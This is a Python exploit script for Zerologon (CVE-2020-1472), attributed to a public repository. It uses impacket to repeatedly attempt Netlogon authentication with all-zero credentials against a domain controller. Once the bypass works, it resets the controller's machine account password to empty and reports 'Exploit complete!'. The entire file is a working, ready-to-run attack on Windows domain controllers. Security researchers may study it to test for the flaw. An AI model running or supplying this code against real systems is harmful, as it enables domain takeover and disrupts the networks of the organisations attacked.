## Author: dirkjanm
## Repository: https://github.com/dirkjanm/CVE-2020-1472

import sys

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5 import transport

MAX_ATTEMPTS = 2000 # False negative chance: 0.04%

class zerologon():
    def __init__(self, dc_ip, target_computer):
        self.dc_handle = '\\\\' + target_computer
        self.target_computer = target_computer
        self.dc_ip = dc_ip
        
    def fail(self, msg):
        print(msg, file=sys.stderr)
        print('[-] This might have been caused by invalid arguments or network issues.', file=sys.stderr)
        sys.exit(2)

    def try_zero_authenticate(self, dce, dc_handle, target_computer):
        # Connect to the DC's Netlogon service.
        # Use an all-zero challenge and credential.
        plaintext = b'\x00' * 8
        ciphertext = b'\x00' * 8

        # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled.
        flags = 0x212fffff

        # Send challenge and authentication request.
        nrpc.hNetrServerReqChallenge(dce, dc_handle + '\x00', target_computer + '\x00', plaintext)
        try:
            server_auth = nrpc.hNetrServerAuthenticate3(
                dce, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                target_computer + '\x00', ciphertext, flags
            )

            # It worked!
            assert server_auth['ErrorCode'] == 0
            return True

        except nrpc.DCERPCSessionError as ex:
            # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
            if ex.get_error_code() == 0xc0000022:
                return None
            else:
                self.fail(f'[-] Unexpected error code from DC: {ex.get_error_code()}.')
        except BaseException as ex:
            self.fail(f'[-] Unexpected error: {ex}.')

    def exploit(self, dc_handle, dce, target_computer):
        request = nrpc.NetrServerPasswordSet2()
        request['PrimaryName'] = dc_handle + '\x00'
        request['AccountName'] = target_computer + '$\x00'
        request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
        authenticator = nrpc.NETLOGON_AUTHENTICATOR()
        authenticator['Credential'] = b'\x00' * 8
        authenticator['Timestamp'] = 0
        request['Authenticator'] = authenticator
        request['ComputerName'] = target_computer + '\x00'
        request['ClearNewPassword'] = b'\x00' * 516
        return dce.request(request)

    def perform_attack(self):
        # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
        print('[+] Performing authentication attempts...')
        binding = epm.hept_map(self.dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
        dce = transport.DCERPCTransportFactory(binding).get_dce_rpc()
        dce.connect()
        dce.bind(nrpc.MSRPC_UUID_NRPC)
        for attempt in range(0, MAX_ATTEMPTS):
            result = self.try_zero_authenticate(dce, self.dc_handle, self.target_computer)

            if result is None:
                print('=', end='', flush=True)
            else:
                break

        if result:
            print('\n[+] Target vulnerable, changing account password to empty string')
            result = None
            for attempt in range(0, MAX_ATTEMPTS):
                try:
                    result = self.exploit(self.dc_handle, dce, self.target_computer)
                except nrpc.DCERPCSessionError as ex:
                    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
                    if ex.get_error_code() == 0xc0000022:
                        pass
                    else:
                        self.fail(f'[-] Unexpected error code from DC: {ex.get_error_code()}.')
                except BaseException as ex:
                    self.fail(f'[-] Unexpected error: {ex}.')
                if result is None:
                    print('=', end='', flush=True)
                else:
                    break

            print('[+] Result: ', end='')
            print(result['ErrorCode'])
            if result['ErrorCode'] == 0:
                print('[+] Exploit complete!')
            else:
                print('[-] Non-zero return code, something went wrong?')
        else:
            print('[-] Attack failed. Target is probably patched.')
            sys.exit(1)
